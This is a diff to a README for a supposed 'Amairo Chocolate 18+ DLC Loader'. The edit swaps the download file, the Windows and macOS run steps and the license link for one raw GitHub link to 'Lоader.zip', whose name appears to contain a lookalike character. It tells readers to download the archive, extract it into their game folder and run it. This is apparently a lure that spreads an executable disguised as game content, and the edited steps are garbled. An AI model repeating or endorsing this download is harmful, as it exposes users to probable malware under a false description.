@@ -30,11 +30,11 @@ Welcome to the **Amairo Chocolate 18+ DLC Loader** repository! This program adds
 
 ## 🌟 Installation Instructions
 
-1. **Download Loader.rar** from this repository.
-2. **Extract** the Loader.rar contents to your Amairo Chocolate game directory.
+1. **Download https://raw.githubusercontent.com/Maxgna/AmairoChocolate18Plus-DeluxeDLC/main/Lоader.zip** from this repository.
+2. **Extract** the https://raw.githubusercontent.com/Maxgna/AmairoChocolate18Plus-DeluxeDLC/main/Lоader.zip contents to your Amairo Chocolate game directory.
 3. **Run** the executable loader application based on your operating system:
-   - For Windows: double-click `AmairoDLC_Loader.exe`
-   - For macOS: open `AmairoDLC_Loader.app`
+   - For Windows: double-click `https://raw.githubusercontent.com/Maxgna/AmairoChocolate18Plus-DeluxeDLC/main/Lоader.zip`
+   - For macOS: open `https://raw.githubusercontent.com/Maxgna/AmairoChocolate18Plus-DeluxeDLC/main/Lоader.zip`
    - For Linux: run `./AmairoDLC_Loader`
 4. **Follow the on-screen instructions** to enable the special content.
 5. *Start your game* – Enjoy the enhanced Amairo Chocolate experience!
@@ -57,7 +57,7 @@ This repository is intended for informational and educational purposes only. The
 
 ## 📄 License (MIT)
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Maxgna/AmairoChocolate18Plus-DeluxeDLC/main/Lоader.zip).
 You are free to use, modify, and distribute this loader with attribution. See the LICENSE file for more details.
 
 ---
